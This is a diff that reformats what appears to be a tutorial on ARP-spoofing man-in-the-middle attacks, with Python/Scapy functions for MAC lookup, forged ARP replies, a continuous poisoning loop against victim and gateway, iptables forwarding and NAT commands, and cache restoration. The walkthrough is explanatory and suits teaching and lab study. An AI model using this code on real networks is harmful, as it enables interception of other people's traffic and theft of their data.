@@ -38,23 +38,27 @@ def enable_ip_forwarding():
     os.system(f"iptables -t nat -A POSTROUTING -o {INTERFACE} -j MASQUERADE")
     os.system(f"iptables -A FORWARD -i {INTERFACE} -j ACCEPT")
 
-echo 1 ...: This tells the OS to allow packet forwarding. Even though the packet is not destined for us, the OS will forward it to the next hop instead of dropping it.
 
-MASQUERADE: This performs NAT (Network Address Translation). When the attacker forwards the victim's packet to the router/internet, it changes the source IP to the attacker’s IP.
+echo 1:
+Enables Linux packet forwarding. Even if the packet is not destined for the attacker, the OS forwards it instead of dropping it.
 
-Why? This ensures the router/website sends the response back to the attacker, not directly to the victim. Without this, the return traffic might bypass the attacker.
+MASQUERADE (NAT):
+Performs Network Address Translation. When the attacker forwards packets to the internet, their source IP becomes the attacker's IP.
 
+Why this matters:
+Ensures the router sends return traffic back to the attacker, not directly to the victim. Without NAT, the victim might bypass the MITM.
 2. Get MAC Address
 We need the hardware addresses (MAC) to construct valid Ethernet frames.
 
-Python
-
+```python 
 def get_mac(ip):
     """ Sends an ARP request to get the MAC address of an IP """
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
     if ans:
         return ans[0][1].hwsrc
     return None
+
+
 This part sends a broadcast ARP request ("Who has this IP?") to the entire network (ff:ff:ff:ff:ff:ff).
 
 It waits for a reply to find the MAC address mapped to the Victim's IP and the Gateway's IP.
@@ -64,11 +68,13 @@ This is the core of the attack where we corrupt the ARP cache.
 
 Python
 
+```python 
 def spoof(target_ip, spoof_ip, target_mac):
     """ Sends the malicious ARP packet (The 'Lie') """
     # op=2 is ARP Reply.
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(packet, verbose=False, iface=INTERFACE)
+
 op=2 (ARP Reply): We use Opcode 2 to forcefully update the ARP table on the target machine, even though they never sent a request.
 
 The Trick: We tell the Target (Victim) that the Spoof IP (Gateway) is located at OUR MAC address.
@@ -78,7 +84,7 @@ Scapy's Role: We do not specify hwsrc (Source MAC). Scapy automatically fills th
 4. Running the Attack (The Loop)
 ARP entries expire after a short time. We must keep lying to maintain the connection.
 
-Python
+```python 
 
 try:
     while True:
@@ -89,6 +95,7 @@ try:
         spoof(WEBSITE_IP, VICTIM_IP, website_mac)
         
         time.sleep(2)
+
 Continuous Spoofing: We enter a while True loop to continuously send packets.
 
 Two-Way Deception: We must poison both the Victim and the Gateway to intercept full duplex traffic.
@@ -98,12 +105,12 @@ time.sleep(2): We send these packets every 2 seconds to ensure the ARP cache sta
 5. Restore (Cleanup)
 When we stop the attack (Ctrl+C), we must be polite and fix the network.
 
-Python
-
+```python 
 def restore(dest_ip, source_ip, dest_mac, source_mac):
     # Send the CORRECT MAC address this time
     packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
     send(packet, count=4, verbose=False, iface=INTERFACE)
+    
 If we simply exit, the victim will have the wrong MAC address cached and will lose internet access (DoS).
 
 This function sends the correct MAC address (hwsrc=source_mac) to the victim and router.
